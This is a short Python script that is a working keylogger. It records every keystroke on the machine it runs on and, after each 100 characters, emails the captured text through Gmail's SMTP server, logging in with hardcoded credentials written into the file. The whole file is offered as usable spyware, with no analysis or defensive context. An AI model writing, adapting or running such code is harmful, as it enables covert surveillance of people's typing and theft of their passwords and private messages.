import smtplib
from pynput.keyboard import Key, Listener

email = "luci@gmail.com"
password = "casdcasdc6767a5s7d"
server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login(email, password)

fullog = ''
words = ''
email_char_limit = 100

def on_press(key):
    global words
    global fullog
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        words += ' '
        fullog += words
        words = ''
        if len(fullog) >= email_char_limit:
            send_log()
            fullog = ''
    if key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        words = words[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        words += char

    if key == Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        fullog
    )

with Listener(on_press=on_press) as listener:
    listener.join()

